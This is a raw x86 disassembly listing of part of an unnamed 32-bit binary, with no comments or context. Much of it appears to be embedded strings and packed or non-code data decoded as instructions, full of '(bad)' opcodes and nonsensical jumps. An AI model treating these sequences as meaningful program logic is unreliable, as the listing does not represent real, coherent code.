  42921d:	bound  ebp,QWORD PTR [ebp+eiz*2+0x42]
  429221:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0xab0070
  429229:	inc    ebx
  42922a:	jb     0x429291
  42922c:	popa   
  42922d:	je     0x429294
  42922f:	push   edx
  429230:	arpl   WORD PTR gs:[edx+edx*2+0x67],si
  429235:	outs   dx,BYTE PTR ds:[esi]
  429236:	add    BYTE PTR [eax+eax*1+0x696c6c45],bh
  42923d:	jo     0x4292b2
  42923f:	add    BYTE PTR gs:[ebp+0x65724300],ah
  429246:	popa   
  429247:	je     0x4292ae
  429249:	push   eax
  42924a:	popa   
  42924b:	ins    BYTE PTR es:[edi],dx
  42924c:	gs je  0x4292c3
  42924f:	add    BYTE PTR gs:[edi],cl
  429252:	add    dl,BYTE PTR [ebp+0x6e]
  429255:	jb     0x4292bc
  429257:	popa   
  429258:	ins    BYTE PTR es:[edi],dx
  429259:	imul   edi,DWORD PTR [edx+0x65],0x656a624f
  429260:	arpl   WORD PTR [eax+eax*1-0x2c],si
  429264:	add    BYTE PTR [ebp+0x78],al
  429267:	je     0x4292bd
  429269:	gs js  0x4292e0
  42926c:	dec    edi
  42926d:	jne    0x4292e3
  42926f:	inc    ecx
  429270:	add    BYTE PTR [ecx+0x1],bh
  429273:	inc    edi
  429274:	gs je  0x4292ca
  429277:	jns    0x4292ec
  429279:	je     0x4292e0
  42927b:	ins    DWORD PTR es:[edi],dx
  42927c:	push   eax
  42927d:	popa   
  42927e:	ins    BYTE PTR es:[edi],dx
  42927f:	gs je  0x4292f6
  429282:	gs inc ebp
  429284:	outs   dx,BYTE PTR ds:[esi]
  429285:	je     0x4292f9
  429287:	imul   esp,DWORD PTR [ebp+0x73],0x5201c600
  42928e:	outs   dx,DWORD PTR ds:[esi]
  42928f:	jne    0x4292ff
  429291:	fs push edx
  429293:	arpl   WORD PTR gs:[eax+eax*1+0x47],si
  429298:	inc    esp
  429299:	dec    ecx
  42929a:	xor    esi,DWORD PTR [edx]
  42929c:	cs fs ins BYTE PTR es:[edi],dx
  42929f:	ins    BYTE PTR es:[edi],dx
  4292a0:	add    BYTE PTR [eax+0x6b],ah
  4292a3:	adc    BYTE PTR [eax],al
  4292a5:	mov    dl,0x30
  4292a7:	adc    BYTE PTR [eax],al
  4292a9:	jp     0x429324
  4292ab:	adc    BYTE PTR [eax],al
  4292ad:	adc    al,0x2b
  4292af:	adc    BYTE PTR [eax],al
  4292b1:	in     eax,0x2f
  4292b3:	adc    BYTE PTR [eax],al
  4292b5:	inc    edi
  4292b6:	pop    esp
  4292b7:	adc    BYTE PTR [eax],al
  4292b9:	xchg   edx,eax
  4292ba:	dec    edi
  4292bb:	adc    BYTE PTR [eax],al
  4292bd:	xchg   ecx,eax
  4292be:	push   ecx
  4292bf:	adc    BYTE PTR [eax],al
  4292c1:	or     dl,BYTE PTR [bx+si]
  4292c4:	add    BYTE PTR [ebx+0x70],ah
  4292c7:	adc    BYTE PTR [eax],al
  4292c9:	xchg   esi,eax
  4292ca:	adc    BYTE PTR fs:[eax],al
  4292cd:	mov    dh,0x69
  4292cf:	adc    BYTE PTR [eax],al
  4292d1:	cdq    
  4292d2:	js     0x4292e4
  4292d4:	add    dl,bl
  4292d6:	data16 adc BYTE PTR [eax],al
  4292d9:	inc    edi
  4292da:	sub    dl,BYTE PTR [eax]
  4292dc:	add    BYTE PTR [eax+ebx*2-0x6d5efff0],ah
  4292e3:	inc    edx
  4292e4:	add    BYTE PTR [ebp-0x56ffbd6e],ah
  4292ea:	xchg   edx,eax
  4292eb:	inc    edx
  4292ec:	add    BYTE PTR [ebp-0x4effbd6e],ch
  4292f2:	xchg   edx,eax
  4292f3:	inc    edx
  4292f4:	add    BYTE PTR [ebp-0x46ffbd6e],dh
  4292fa:	xchg   edx,eax
  4292fb:	inc    edx
  4292fc:	add    BYTE PTR [ebp+0x4d004292],bh
  429302:	push   ebp
  429303:	mov    DWORD PTR [ebx-0x7e9d13f8],ecx
  429309:	mov    esp,ebp
  42930b:	or     ah,dh
  42930d:	dec    ebp
  42930e:	add    bh,al
  429310:	add    BYTE PTR [eax],cl
  429312:	add    BYTE PTR [eax],al
  429314:	mov    DWORD PTR [eax],0x40f44545
  42931a:	xor    eax,0x9c8b8500
  42931f:	hlt    
  429320:	clc    
  429321:	retf   
  429322:	(bad)  
  429323:	enter  0x4d45,0xbc
  429327:	mov    esi,DWORD PTR [esp+esi*8]
  42932a:	test   ebx,ecx
  42932c:	pushf  
  42932d:	enter  0x4df8,0x8b
  429331:	mov    DWORD PTR [ebp-0x20],0x890208
  429338:	inc    ebp
  429339:	inc    ebp
  42933a:	cld    
  42933b:	xor    cl,BYTE PTR [ebx-0xb38b300]
  429341:	or     BYTE PTR [ebx+0x0],dl
  429344:	mov    ebx,0x8bd5700
  429349:	call   DWORD PTR [ecx-0x1]
  42934c:	pop    es
  42934d:	mov    ch,0x33
  42934f:	dec    ebx
  429351:	(bad)  
  429352:	mov    eax,0x72009ea4
  429357:	push   DWORD PTR [edx]
  429359:	or     BYTE PTR [eax],al
  42935b:	jmp    0xff89:0x75c84d03
  429362:	dec    ebp
  429363:	loopne 0x429335
  429365:	ror    BYTE PTR [ebx-0xbf5b2bb],cl
  42936b:	add    BYTE PTR [ebx],dh
  42936d:	mov    ecx,ebx
  42936f:	hlt    
  429370:	add    ecx,ebx
  429372:	enter  0x899e,0x32
  429376:	dec    ebp
  429377:	add    ecx,eax
  429379:	mov    DWORD PTR [ebx-0xbb2b2f8],ecx
  42937f:	or     DWORD PTR [ebx-0xb00b29c],0x0
  429386:	xor    ecx,ebx
  429388:	retf   
  429389:	enter  0x4d03,0xc8
  42938d:	mov    DWORD PTR fs:[eax],ebx
  429390:	lea    eax,[eax]
  429392:	push   esp
  429393:	mov    edi,edi
  429395:	fs (bad) 
  429397:	(bad)  
  429398:	dec    DWORD PTR [ebx-0x7aa8cfaa]
  42939e:	push   0xffffffff
  4293a0:	and    bh,bh
  4293a2:	pop    ecx
  4293a3:	inc    eax
  4293a4:	mov    DWORD PTR [ecx-0xb2aff8],ecx
  4293aa:	push   0xffffff8b
  4293ac:	pop    ecx
  4293ad:	cld    
  4293ae:	dec    ebp
  4293af:	lea    ecx,[ecx+0x45ff08ff]
  4293b5:	mov    BYTE PTR [edx+0x1],cl
  4293b8:	add    BYTE PTR [eax],al
  4293ba:	mov    DWORD PTR [ebp+0x8],0x58008d
  4293c1:	dec    DWORD PTR [ebp-0x77]
  4293c4:	xor    esp,DWORD PTR [ebx+eax*1+0x88b8900]
  4293cb:	cld    
  4293cc:	dec    ebp
  4293cd:	jne    0x429402
  4293cf:	lea    eax,[ebx]
  4293d1:	push   eax
  4293d2:	mov    edi,edi
  4293d4:	or     BYTE PTR [ecx+0x54a845],cl
  4293da:	add    al,ch
  4293dc:	(bad)  
  4293dd:	sub    esp,ebp
  4293df:	add    BYTE PTR [eax],al
  4293e1:	rol    BYTE PTR [eax],0x84
  4293e4:	inc    ebp
  4293e5:	add    dh,BYTE PTR [esi+0x0]
  4293e8:	add    BYTE PTR [ebp-0x73],al
  4293eb:	mov    ebp,DWORD PTR [esp+edx*4]
  4293ee:	inc    DWORD PTR [eax]
  4293f0:	lea    ecx,[ebx-0x30074f4]
  4293f6:	call   0x439f7b
  4293fb:	add    BYTE PTR [ebp+0x0],cl
  4293fe:	jne    0x429441
  429400:	dec    DWORD PTR [ebx-0x76210314]
  429406:	dec    ebp
  429407:	add    DWORD PTR [ebp+0x0],esi
  42940a:	(bad)  
  42940b:	xchg   ebp,eax
  42940c:	loopne 0x42940d
  42940e:	inc    eax
  42940f:	inc    DWORD PTR [eax]
  429411:	mov    ecx,DWORD PTR [ebp-0x4]
  429414:	xor    edx,DWORD PTR [edx+0x7201b8]
  42941a:	add    BYTE PTR [edx],dl
  42941c:	enter  0x4d90,0x0
  429420:	mov    eax,DWORD PTR [eax]
  429422:	hlt    
  429423:	add    al,0xa5
  429425:	mov    al,0xff
  429427:	add    bh,bh
  429429:	add    BYTE PTR [ebx],dh
  42942b:	inc    DWORD PTR [ebx]
  42942d:	sbb    al,0x89
  42942f:	jne    0x429409
  429431:	mov    esp,DWORD PTR [ecx+0x4500fc]
  429437:	mov    eax,DWORD PTR [ebp-0xff0048]
  42943d:	mov    DWORD PTR [eax-0x70],0xee58e189
  429444:	inc    DWORD PTR [ebp-0x75]
  429447:	ror    DWORD PTR [esp+ebp*8],1
  42944a:	test   DWORD PTR [esi-0x1],esp
  42944d:	inc    ebp
  42944e:	(bad)  
  42944f:	aas    
  429450:	inc    ebp
  429451:	(bad)  
  429452:	lea    edi,[esp+eiz*2-0x1]
  429456:	push   DWORD PTR [edi]
  429458:	mov    DWORD PTR [ecx],esi
  42945a:	mov    al,ds:0x8b8000c7
  42945f:	out    dx,al
  429460:	cld    
  429461:	call   0xed41d9f3
  429466:	(bad)  
  429467:	fisttp WORD PTR [eax+0x8801c7]
  42946d:	jmp    0x4294b4
  42946f:	out    dx,al
  429470:	inc    DWORD PTR [ebp-0x4]
  429473:	xlat   BYTE PTR ds:[ebx]
  429474:	lea    edi,[edi]
  429476:	inc    edi
  429478:	jmp    FWORD PTR [eax-0x78]
  42947b:	inc    DWORD PTR [ecx]
  42947d:	aaa    
  42947e:	add    BYTE PTR [ecx],dh
  429480:	repnz mov DWORD PTR [eax],0xfff856c
  429487:	ffreep st(5)
  429489:	aas    
  42948a:	add    bh,al
  42948c:	mov    esi,DWORD PTR [eax-0x4]
  42948f:	inc    DWORD PTR [eax+0xdf01ec]
  429495:	(bad)  
  429496:	or     BYTE PTR [ebp+eax*2-0x1],dh
  42949a:	mov    esp,ebx
  42949c:	xchg   esp,eax
  42949d:	rol    DWORD PTR [eax],cl
  42949f:	(bad)  
  4294a0:	mov    edi,DWORD PTR [eax+0x3]
  4294a3:	(bad)  
  4294a4:	cmp    al,0xd7
  4294a6:	dec    ebp
  4294a7:	lds    ecx,FWORD PTR [ebx+0x29d8e8]
  4294ad:	add    BYTE PTR [ebp-0x3b375],cl
  4294b3:	adc    BYTE PTR [edx+0x1],0x55
  4294b7:	add    BYTE PTR [ebx+0x58c30],cl
  4294bd:	add    BYTE PTR [ebx-0x778afc7b],cl
  4294c3:	mov    eax,DWORD PTR [eax]
  4294c5:	cld    
  4294c6:	push   0x7d
  4294c8:	dec    DWORD PTR [ebx+0xd88c]
  4294ce:	push   edx
  4294cf:	mov    edx,DWORD PTR [ecx-0x4]
  4294d2:	call   DWORD PTR [eax+0x7d01fc]
  4294d8:	mov    esp,DWORD PTR [esp+edi*8]
  4294db:	add    BYTE PTR [eax+0x560150],dl
  4294e1:	test   DWORD PTR [ebp+0x75],eax
  4294e4:	call   0xc83f7574
  4294e9:	jge    0x42947f
  4294eb:	mov    ebp,ebx
  4294ed:	fcom   st(7)
  4294ef:	add    bh,al
  4294f1:	mov    ebx,DWORD PTR [eax-0x7a6f8304]
  4294f7:	add    edi,edi
  4294f9:	add    bh,bh
  4294fb:	add    ah,cl
  4294fd:	add    ah,dl
  4294ff:	push   eax
  429500:	inc    ebp
  429501:	push   esi
  429502:	fisttp WORD PTR [ebx+0x4dc7f43f]
  429508:	test   BYTE PTR [ebx],dh
  42950a:	aam    0x5
  42950c:	retf   0x4572
  42950f:	add    bl,ah
  429511:	rcl    ebx,0x84
  429514:	mov    DWORD PTR [ecx],0x46d1008c
  42951a:	jl     0x42951c
  42951c:	test   edi,eax
  42951e:	jmp    esp
  429520:	inc    DWORD PTR [eax]
  429522:	loope  0x429524
  429524:	aam    0x75
  429526:	test   DWORD PTR [ebx+0x45fffcff],ecx
  42952c:	out    dx,al
  42952d:	mov    ebp,eax
  42952f:	mov    ah,0x85
  429531:	add    bh,bh
  429533:	call   0x116be37
  429538:	retf   0x858b
  42953b:	cld    
  42953c:	inc    DWORD PTR [eax+0xeb01ff]
  429542:	out    dx,al
  429543:	xor    BYTE PTR [ebp-0xff0085],al
  429549:	mov    edx,ecx
  42954b:	cld    
  42954c:	jl     0x4294d7
  42954e:	push   ebx
  42954f:	add    DWORD PTR [eax],eax
  429551:	add    BYTE PTR [eax+0x1],dl
  429554:	inc    ebp
  429555:	inc    ebp
  429556:	mov    ecx,DWORD PTR [ebx+0xd8a8]
  42955c:	dec    DWORD PTR [ebx-0x3fd90318]
  429562:	add    BYTE PTR [ebp-0xbf0040],dl
  429568:	inc    ebp
  429569:	retf   0x8b
  42956c:	cld    
  42956d:	push   eax
  42956e:	mov    al,0x45
  429570:	add    DWORD PTR [ebx+0x459c00],ecx
  429576:	mov    edi,edi
  429578:	mov    eax,0xe80800ff
  42957d:	inc    ebp
  42957e:	sub    DWORD PTR [ebx-0x47000400],ecx
  429584:	add    al,0x1
  429586:	rol    BYTE PTR [eax],0x1e
  429589:	jne    0x4295d0
  42958b:	xor    ecx,DWORD PTR [ebx-0x4f830373]
  429591:	inc    DWORD PTR [ecx]
  429593:	call   0x87bd98
  429598:	mov    ecx,DWORD PTR [ebx-0x7fff0348]
  42959e:	call   0x42bea4
  4295a3:	xor    bh,bh
  4295a5:	push   edi
  4295a6:	adc    BYTE PTR [ebx-0x747423bb],al
  4295ac:	loopne 0x42958a
  4295ae:	ret    
  4295af:	loopne 0x42954f
  4295b1:	xor    DWORD PTR [edx],0x31
  4295b4:	cmp    edi,edi
  4295b6:	bswap  esp
  4295b8:	rol    BYTE PTR gs:[eax],0x5
  4295bc:	jmp    0x12d9706
  4295c1:	mov    eax,DWORD PTR [ebp-0x4]
  4295c4:	add    BYTE PTR [eax+0xff0100],bh
  4295ca:	cld    
  4295cb:	jne    0x42964a
  4295cd:	xor    ecx,DWORD PTR [ebx-0x6f6f0373]
  4295d3:	pusha  
  4295d4:	add    DWORD PTR [eax],eax
  4295d6:	add    BYTE PTR [eax-0x37],dl
  4295d9:	inc    ebp
  4295da:	add    BYTE PTR [ebx+0x459850],cl
  4295e0:	mov    edi,edi
  4295e2:	test   al,0xff
  4295e4:	add    BYTE PTR [eax],cl
  4295e6:	inc    DWORD PTR [ebp-0x18]
  4295e9:	jmp    DWORD PTR ds:0x4d7d00dc
  4295ef:	adc    BYTE PTR [ebx+0x459cb9],cl
  4295f5:	mov    ecx,DWORD PTR [ecx-0x33c7404]
  4295fb:	sahf   
  4295fc:	mov    eax,0x30132
  429601:	lea    esi,[ebp+0x2c]
  429604:	xor    edi,edi
  429606:	(bad)  
  429607:	call   0x141be74
  42960c:	call   0x136be9c
  429611:	jne    0x42959e
  429613:	xor    edi,esp
  429615:	add    eax,DWORD PTR [eax+0xc018d]
  42961b:	push   DWORD PTR [eax]
  42961d:	call   0xcbbe79
  429622:	int3   
  429623:	inc    DWORD PTR [ebp-0x14]
  429626:	mov    ecx,DWORD PTR [ebp-0x28]
  429629:	xor    eax,DWORD PTR [eax]
  42962b:	add    ecx,DWORD PTR [ebx-0x3f8a03c5]
  429631:	(bad)  
  429632:	xchg   ebp,eax
  429633:	in     al,0xff
  429635:	add    bh,bh
  429637:	add    BYTE PTR [edi+0x508b0045],bl
  42963d:	or     BYTE PTR [ebp-0x3d],al
  429640:	mov    eax,DWORD PTR [esp+ebx*4-0xcdff62]
  429647:	mov    edi,edi
  429649:	or     BYTE PTR [eax],cl
  42964b:	inc    ebp
  42964c:	test   DWORD PTR gs:[eax],eax
  42964f:	je     0x429696
  429651:	mov    eax,DWORD PTR [ebx-0x3fb2f844]
  429657:	xor    edx,DWORD PTR [eax-0x73]
  42965a:	push   ebp
  42965b:	or     BYTE PTR [ebp+0x21007572],al
  429661:	inc    ebp
  429662:	in     al,dx
  429663:	mov    ebp,DWORD PTR [eax]
  429665:	mov    esp,0x628bc345
  42966a:	fmul   st,st(5)
  42966c:	add    BYTE PTR [ebx],ch
  42966e:	mov    eax,DWORD PTR [ebx]
  429670:	cld    
  429671:	loopne 0x429633
  429673:	inc    ebp
  429674:	push   ebp
  429675:	cmp    ebp,eax
  429677:	movaps xmm4,XMMWORD PTR [eax-0x74740100]
  42967e:	cld    
  42967f:	fadd   DWORD PTR [eax+0x3b014d]
  429685:	jne    0x4296b7
  429687:	push   0xf8898557
  42968c:	in     al,dx
  42968d:	jne    0x4296d4
  42968f:	lea    eax,[ebx+0x72e8dcc8]
  429695:	xor    BYTE PTR [ebx+0x7545bc00],cl
  42969b:	jmp    0x4296d0
  42969d:	mov    edi,DWORD PTR [edi+0x4572bc]
  4296a3:	xor    eax,edi
  4296a5:	adc    DWORD PTR [ebp-0xcd0062],0x8b2b31
  4296af:	rcl    BYTE PTR [eax-0x40],1
  4296b2:	inc    ebp
  4296b3:	lock mov eax,DWORD PTR [esp+edi*8-0x38ff3cf9]
  4296bb:	inc    ebp
  4296bc:	xchg   ebp,eax
  4296bd:	ud0    ebp,DWORD PTR [ebx]
  4296c0:	inc    DWORD PTR [eax]
  4296c2:	adc    eax,0x508a0076
  4296c7:	adc    BYTE PTR [ebp+0x1f],0x8b
  4296cb:	or     al,0xf4
  4296cd:	inc    eax
  4296ce:	retf   
  4296cf:	inc    ebp
  4296d0:	iret   
  4296d1:	jb     0x42969b
  4296d3:	mov    eax,DWORD PTR [edi]
  4296d5:	enter  0x4545,0x1
  4296d9:	xor    eax,0x898b9c00
  4296de:	mov    esp,0x33344df0
  4296e3:	pushf  
  4296e4:	lea    ecx,[ecx+0x4d72e008]
  4296ea:	add    BYTE PTR [ebx],dh
  4296ec:	inc    ebp
  4296ed:	mov    DWORD PTR [ebx-0x3f611b4c],ecx
  4296f3:	xor    dl,BYTE PTR [edx]
  4296f5:	add    eax,DWORD PTR [ebp-0x77]
  4296f8:	mov    eax,esp
  4296fa:	fmul   DWORD PTR [ebp-0x3d]
  4296fd:	xor    eax,DWORD PTR [ebx+eax*1+0x832899e]
  429704:	mov    DWORD PTR [ebp-0x28],eax
  429707:	aad    0x45
  429709:	pushf  
  42970a:	xor    eax,edi
  42970c:	mov    ecx,0xff858db0
  429711:	clc    
  429712:	enter  0x4d45,0x32
  429716:	mov    ebx,DWORD PTR [eax+ecx*1-0x795b3e39]
  42971d:	test   esi,edi
  42971f:	clc    
  429720:	inc    DWORD PTR [ebp+0x45]
  429723:	xor    BYTE PTR [ebx-0x3738f764],cl
  429729:	test   al,0x16
  42972b:	test   DWORD PTR ds:0xff459cf8,esi
  429731:	ds cld 
  429733:	pushf  
  429734:	inc    ebp
  429735:	mov    edx,DWORD PTR [eax-0x28]
  429738:	popf   
  429739:	push   ebp
  42973a:	add    BYTE PTR [ebx],dh
  42973c:	mov    DWORD PTR [ebx],eax
  42973e:	sar    BYTE PTR [ebx],1
  429740:	adc    BYTE PTR [edi],cl
  429742:	dec    ebp
  429743:	adc    al,0x8b
  429745:	add    al,dl
  429747:	jmp    0x1039917
  42974c:	jb     0x42979b
  42974e:	add    BYTE PTR [ebx-0x2e8a0ff8],cl
  429754:	xor    ecx,DWORD PTR [ebp+0x3b]
  429757:	xor    ecx,DWORD PTR [edi]
  429759:	add    ecx,DWORD PTR [ebx+edi*1+0x0]
  42975d:	(bad)  
  42975f:	clc    
  429760:	enter  0x8400,0x8b
  429764:	pop    es
  429765:	mov    al,0x0
  429767:	push   ebp
  429768:	push   cs
  429769:	xor    ecx,eax
  42976b:	xor    esp,ecx
  42976d:	add    ebp,DWORD PTR [eax]
  42976f:	add    esi,DWORD PTR [eax]
  429771:	(bad)  
  429773:	retf   0x55c8
  429776:	repnz mov eax,DWORD PTR [ebp-0x10]
  42977a:	(bad)  
  42977b:	cli    
  42977c:	fdivr  st,st(1)
  42977e:	test   DWORD PTR [eax+edi*8],ecx
  429781:	dec    ebp
  429782:	inc    ebp
  429783:	xor    edi,DWORD PTR [eax-0x7167afd]
  429789:	add    BYTE PTR [ebp+0x0],al
  42978c:	mov    ecx,DWORD PTR [ebp-0x28]
  42978f:	mov    ecx,ebx
  429791:	clc    
  429792:	jne    0x42975f
  429794:	mov    esi,0xd672d3
  429799:	into   
  42979a:	into   
  42979b:	scas   eax,DWORD PTR es:[edi]
  42979c:	dec    ebp
  42979d:	mov    ecx,DWORD PTR [ebx-0x3482273c]
  4297a3:	sub    ecx,esi
  4297a5:	cmp    ecx,DWORD PTR [ebp+0x77]
  4297a8:	(bad)  
  4297a9:	mov    edi,eax
  4297ab:	mov    al,0x85
  4297ad:	mov    eax,edi
  4297af:	add    BYTE PTR [ebp-0x75],al
  4297b2:	xor    esp,DWORD PTR [esp+ebx*4-0x47cc38ab]
  4297b9:	xor    eax,DWORD PTR [ebp+0x4503f803]
  4297bf:	rdtsc  
  4297c1:	retf   0x559c
  4297c4:	(bad)  
  4297c5:	mov    ebp,DWORD PTR [eax+esi*8-0x607057b]
  4297cc:	inc    ebp
  4297cd:	add    eax,0xeb9c4d3f
  4297d2:	(bad)  
  4297d3:	mov    ecx,esp
  4297d5:	lods   al,BYTE PTR ds:[esi]
  4297d6:	test   DWORD PTR [ebp-0x8],edx
  4297d9:	xor    ecx,DWORD PTR [ebp+0x33]
  4297dc:	mov    eax,DWORD PTR [ebx]
  4297de:	lock add ecx,ebx
  4297e1:	bswap  esi
  4297e3:	retf   0x55d1
  4297e6:	test   BYTE PTR [ebx-0x5ff0ffe],cl
  4297ec:	jmp    0x4297e7
  4297ee:	add    BYTE PTR ds:0xebc44d8b,al
  4297f4:	push   ebp
  4297f5:	mov    ebp,DWORD PTR [ebx]
  4297f7:	test   al,0x8b
  4297f9:	push   ebp
  4297fa:	clc    
  4297fb:	xor    ecx,ebx
  4297fd:	xor    ecx,esi
  4297ff:	add    edx,ecx
  429801:	add    eax,DWORD PTR [edx+0xca010f]
  429807:	push   ebp
  429808:	dec    ebp
  429809:	mov    ecx,DWORD PTR [ebx-0x34050710]
  42980f:	stc    
  429810:	rol    DWORD PTR ds:0xebce4dd6,cl
  429816:	scas   eax,DWORD PTR es:[edi]
  429817:	mov    ecx,DWORD PTR [ebx+0x7d55c4cc]
  42981d:	xor    ebp,DWORD PTR [ebx]
  42981f:	xor    edi,DWORD PTR [ebx]
  429821:	add    esi,DWORD PTR [edi+0x3]
  429824:	mov    ecx,DWORD PTR [edi]
  429826:	clc    
  429827:	retf   0x55cb
  42982a:	into   
  42982b:	mov    edi,DWORD PTR [eax+esi*8-0x6740600]
  429832:	mov    eax,0x3376554d
  429837:	mov    esi,DWORD PTR [ebx]
  429839:	int3   
  42983a:	add    edx,DWORD PTR [ebp+0x3]
  42983d:	xor    ecx,DWORD PTR [edi]
  42983f:	xor    ecx,edx
  429841:	add    edx,DWORD PTR [ebp+0x3]
  429844:	mov    ecx,DWORD PTR [edi]
  429846:	lock retf 0x4dfa
  42984a:	stc    
  42984b:	mov    ecx,DWORD PTR [eax]
  42984d:	or     BYTE PTR [ebp+0x4d],cl
  429850:	jmp    0x10698e0
  429855:	dec    ebp
  429856:	dec    ebp
  429857:	(bad)  
  429858:	mov    ebx,esp
  42985a:	clc    
  42985b:	test   ebx,ecx
  42985d:	clc    
  42985e:	ror    DWORD PTR [ebp-0x2a],cl
  429861:	mov    esi,ecx
  429863:	call   0x33cdde17
  429868:	les    ebx,FWORD PTR [ebp+edi*2+0x3bdc2b8b]
  42986f:	retf   
  429870:	ja     0x429840
  429872:	mov    ebp,DWORD PTR [eax-0x48]
  429875:	dec    ebp
  429876:	xor    ecx,DWORD PTR [di+0x3]
  42987a:	mov    esp,esp
  42987c:	clc    
  42987d:	push   ebp
  42987e:	retf   
  42987f:	mov    dl,bl
  429881:	adc    esi,edx
  429883:	jb     0x429853
  429885:	add    BYTE PTR [edi-0x3b7474b3],ch
  42988b:	call   0x4d6e640d
  429890:	cmp    ecx,DWORD PTR [ebx-0x73742789]
  429896:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  429897:	sahf   
  429898:	inc    ebp
  429899:	xor    cl,BYTE PTR [ebp-0x78]
  42989c:	mov    edx,edi
  42989e:	clc    
  42989f:	dec    ebp
  4298a0:	retf   
  4298a1:	mov    edx,ebx
  4298a3:	call   0x56116c7e
  4298a8:	scas   eax,DWORD PTR es:[edi]
  4298a9:	mov    ecx,DWORD PTR [ebx+0x7d8cc4d8]
  4298af:	sahf   
  4298b0:	sub    esi,DWORD PTR [edx]
  4298b2:	cmp    ecx,DWORD PTR [edx+0x558bd777]
  4298b8:	lods   al,BYTE PTR ds:[esi]
  4298b9:	xor    esp,DWORD PTR [ebx]
  4298bb:	add    ecx,DWORD PTR [ebp-0x1c]
  4298be:	mov    edi,DWORD PTR [ebp-0x8]
  4298c1:	mov    bl,cl
  4298c3:	cmp    dl,bl
  4298c5:	jb     0x429895
  4298c7:	add    dh,dl
  4298c9:	dec    ebp
  4298ca:	scas   eax,DWORD PTR es:[edi]
  4298cb:	mov    ecx,DWORD PTR [ebx+0x7dcbc4e8]
  4298d1:	shr    DWORD PTR [ebx],cl
  4298d3:	into   
  4298d4:	cmp    edx,esi
  4298d6:	mov    ebp,DWORD PTR [edi-0x1bfcfc58]
  4298dc:	dec    ebp
  4298dd:	dec    ebp
  4298de:	mov    ecx,DWORD PTR [ebx+0x55d3e8f8]
  4298e4:	retf   
  4298e5:	xor    edx,esi
  4298e7:	add    ecx,esi
  4298e9:	imul   ecx,edx
  4298ec:	mov    DWORD PTR [ebp+0x8],edx
  4298ef:	xor    ecx,DWORD PTR [ebp+0x2b]
  4298f2:	mov    DWORD PTR [ebx+0x7d4de8ec],ecx
  4298f8:	add    esi,DWORD PTR [ebx]
  4298fa:	mov    ah,0x3
  4298fc:	inc    ebp
  4298fd:	sysexit 
  4298ff:	xlat   BYTE PTR ds:[ebx]
  429900:	pushf  
  429901:	jge    0x42988c
  429903:	xor    ebx,eax
  429905:	sub    eax,DWORD PTR [ebp-0x73]
  429908:	(bad)  
  429909:	cmp    al,al
  42990b:	jb     0x429892
  42990d:	add    al,bh
  42990f:	ror    DWORD PTR [ebp-0x7a],1
  429912:	xor    edi,edi
  429914:	add    edi,edi
  429916:	jmp    0x429965
  429918:	mov    ecx,DWORD PTR [ebx-0x34341324]
  42991e:	dec    ebp
  42991f:	into   
  429920:	mov    ebp,DWORD PTR [edi-0x23737428]
  429926:	sahf   
  429927:	shl    DWORD PTR [edx],cl
  429929:	retf   0x5588
  42992c:	or     ecx,DWORD PTR [ebp+0x7233114d]
  429932:	add    eax,DWORD PTR [eax]
  429934:	in     al,0x4d
  429936:	push   ebp
  429937:	mov    ecx,DWORD PTR [edx+0x72cb11e0]
  42993d:	bound  eax,QWORD PTR [eax]
  42993f:	int    0x4d
  429941:	sub    ecx,DWORD PTR [edx+0x55f00b03]
  429947:	dec    ebp
  429948:	xor    ecx,DWORD PTR [ebx-0x341b3bfd]
  42994e:	jge    0x42991e
  429950:	mov    BYTE PTR [edi+0xf723b3a],ch
  429956:	add    cl,dh
  429958:	dec    ebp
  429959:	dec    DWORD PTR [ebx-0x2c032375]
  42995f:	adc    BYTE PTR [ebp+0x1],0x8b
  429963:	add    al,bl
  429965:	jge    0x4298f3
  429967:	push   0xffffff9e
  429969:	push   0x8b3032
  42996e:	shl    BYTE PTR [ebp+0x55],0x6a
  429972:	xor    edi,edi
  429974:	xor    edx,DWORD PTR [ebx+eax*1]
  429977:	inc    ebp
  429978:	add    eax,DWORD PTR [ebp-0x7c358bf1]
  42997e:	dec    ebp
  42997f:	or     BYTE PTR [ecx+0x4dc8e483],cl
  429985:	jbe    0x429912
  429987:	mov    ebp,esp
  429989:	ror    bl,1
  42998b:	enter  0x14ce,0xaf
  42998f:	dec    DWORD PTR [ebx-0x2cef17f8]
  429995:	push   ebp
  429996:	retf   0x5540
  429999:	push   ebp
  42999a:	mov    esi,DWORD PTR [edx-0x1c]
  42999d:	mov    edx,ebx
  42999f:	cld    
  4299a0:	(bad)  
  4299a1:	sub    BYTE PTR [edi-0x23ff74ff],0x0
  4299a8:	sti    
  4299a9:	add    dh,cl
  4299ab:	push   0xffffff94
  4299ad:	call   FWORD PTR [esi+0x3b5032d0]
  4299b3:	mov    ecx,DWORD PTR [edi]
  4299b5:	int3   
  4299b6:	pop    esi
  4299b7:	inc    ebp
  4299b8:	dec    DWORD PTR [ecx+0x45e8c88b]
  4299be:	push   ebp
  4299bf:	xor    esi,DWORD PTR [ebx]
  4299c1:	mov    DWORD PTR [ebx],0xcacc0f9c
  4299c7:	aas    
  4299c8:	push   ebp
  4299c9:	inc    ebp
  4299ca:	xor    eax,esp
  4299cc:	add    eax,esp
  4299ce:	mov    eax,DWORD PTR [ebx]
  4299d0:	(bad)  
  4299d1:	jmp    0x42995f
  4299d3:	mov    bl,BYTE PTR [esi-0x7674cdfb]
  4299d9:	rol    ah,1
  4299db:	mov    esi,0xf133104d
  4299e0:	mov    edx,0xff358d80
  4299e5:	mov    dh,0xd1
  4299e7:	cmp    edx,DWORD PTR [ebp+0xf]
  4299ea:	mov    eax,DWORD PTR [edx-0x20]
  4299ed:	add    BYTE PTR [ebp-0x75],bh
  4299f0:	xor    edi,DWORD PTR [ebx+eax*1-0x307bf035]
  4299f7:	sahf   
  4299f8:	retf   0x8632
  4299fb:	cmp    ebp,0x8
  4299fe:	call   ebx
  429a00:	inc    ebp
  429a01:	inc    ebp
  429a02:	mov    ecx,DWORD PTR [ebx+0x450008d8]
  429a08:	mov    esi,DWORD PTR ds:0xc7049cc8
  429a0e:	add    al,al
  429a10:	add    bl,al
  429a12:	(bad)  
  429a13:	clc    
  429a14:	enter  0x45,0x35
  429a18:	push   eax
  429a19:	pushf  
  429a1a:	mov    edi,eax
  429a1c:	int3   
  429a1d:	or     al,al
  429a1f:	test   DWORD PTR [edi],edi
  429a21:	clc    
  429a22:	gs inc ebp
  429a24:	add    BYTE PTR [ebx+0x4d00fc7d],cl
  429a2a:	push   ss
  429a2b:	xor    ecx,DWORD PTR [ebp+0x3]
